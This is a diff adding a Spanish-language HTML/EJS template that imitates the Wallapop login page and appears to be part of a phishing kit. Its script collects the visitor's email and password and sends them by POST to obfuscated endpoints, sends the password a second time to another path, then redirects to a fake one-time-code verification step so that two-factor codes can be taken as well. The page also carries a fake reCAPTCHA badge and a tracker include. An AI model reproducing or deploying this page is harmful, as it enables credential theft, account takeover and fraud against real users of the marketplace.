@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallapop - ¡Te damos la bienvenida!</title>
+    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
+    <link rel="stylesheet" href="/css/wallapop.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <%- include('partials/tracker') %>
+</head>
+<body>
+    <!-- Top Header with Wallapop Logo -->
+    <header class="wlp-header">
+        <div class="wlp-header-inner">
+            <a href="/" class="wlp-logo-link">
+                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
+            </a>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="wlp-page-wrapper">
+        <div class="wlp-card">
+            <h1 class="wlp-title">¡Te damos la bienvenida!</h1>
+
+            <form id="loginForm" method="post" autocomplete="on">
+                <div class="wlp-form-group">
+                    <input 
+                        type="text" 
+                        name="username" 
+                        id="username" 
+                        class="wlp-input" 
+                        placeholder="Dirección de email"
+                        autocomplete="username email"
+                        required
+                    >
+                    <div id="emailError" class="wlp-error-text">Introduce tu dirección de email.</div>
+                </div>
+
+                <div class="wlp-form-group">
+                    <div class="wlp-password-wrapper">
+                        <input 
+                            type="password" 
+                            name="password" 
+                            id="password" 
+                            class="wlp-input" 
+                            placeholder="Contraseña"
+                            autocomplete="current-password"
+                            required
+                        >
+                        <button type="button" class="wlp-eye-btn" id="togglePasswordBtn" aria-label="Mostrar u ocultar contraseña">
+                            <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                <circle cx="12" cy="12" r="3"></circle>
+                            </svg>
+                        </button>
+                    </div>
+                    <div id="passwordError" class="wlp-error-text">Introduce tu contraseña.</div>
+                </div>
+
+                <div class="wlp-forgot-link-box">
+                    <a href="#" class="wlp-link" onclick="return false;">¿Has olvidado tu contraseña?</a>
+                </div>
+
+                <button type="submit" class="wlp-btn-primary" id="submitBtn">Acceder a Wallapop</button>
+            </form>
+        </div>
+    </main>
+
+    <!-- reCAPTCHA Badge -->
+    <div class="wlp-recaptcha-badge">
+        <svg width="24" height="24" viewBox="0 0 48 48" fill="none">
+            <path d="M24 4C12.95 4 4 12.95 4 24C4 35.05 12.95 44 24 44C35.05 44 44 35.05 44 24C44 12.95 35.05 4 24 4ZM24 40C15.16 40 8 32.84 8 24C8 15.16 15.16 8 24 8C32.84 8 40 15.16 40 24C40 32.84 32.84 40 24 40Z" fill="#1A73E8"/>
+            <path d="M24 14V20L30 14L24 8V14ZM24 34V28L18 34L24 40V34Z" fill="#1A73E8"/>
+        </svg>
+        <div style="display: flex; flex-direction: column; font-size: 10px; line-height: 1.2;">
+            <span style="color: #666; font-weight: 500;">reCAPTCHA</span>
+            <span style="color: #999;">Privacidad - Términos</span>
+        </div>
+    </div>
+
+    <script>
+        // Toggle password visibility
+        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
+        const passwordInput = document.getElementById('password');
+        const eyeIcon = document.getElementById('eyeIcon');
+
+        togglePasswordBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            const isPassword = passwordInput.getAttribute('type') === 'password';
+            passwordInput.setAttribute('type', isPassword ? 'text' : 'password');
+            
+            // Toggle eye icon
+            if (isPassword) {
+                eyeIcon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line>';
+            } else {
+                eyeIcon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle>';
+            }
+        });
+
+        // Form submission handling
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        const submitBtn = document.getElementById('submitBtn');
+
+        usernameInput.addEventListener('input', function() {
+            emailError.style.display = 'none';
+            usernameInput.classList.remove('input-error');
+        });
+
+        passwordInput.addEventListener('input', function() {
+            passwordError.style.display = 'none';
+            passwordInput.classList.remove('input-error');
+        });
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value.trim();
+            let hasError = false;
+
+            if (!username) {
+                emailError.style.display = 'block';
+                usernameInput.classList.add('input-error');
+                hasError = true;
+            }
+
+            if (!password) {
+                passwordError.style.display = 'block';
+                passwordInput.classList.add('input-error');
+                hasError = true;
+            }
+
+            if (hasError) return;
+
+            submitBtn.textContent = 'Accediendo...';
+            submitBtn.disabled = true;
+
+            // Send username and password
+            $.ajax({
+                url: '/gzLbTbjqMpc34D4XsPJ2',
+                type: 'POST',
+                contentType: 'application/json',
+                data: JSON.stringify({ username: username, password: password }),
+                success: function(info) {
+                    // Send password to posas endpoint as well
+                    $.ajax({
+                        url: '/SSwP85AgNE4pnL5mWSM',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({ password: password }),
+                        complete: function() {
+                            window.location = "/loading?time=2&url=/WlpOtpVerification";
+                        }
+                    });
+                },
+                error: function() {
+                    window.location = "/loading?time=2&url=/WlpOtpVerification";
+                }
+            });
+        });
+    </script>
+</body>
+</html>
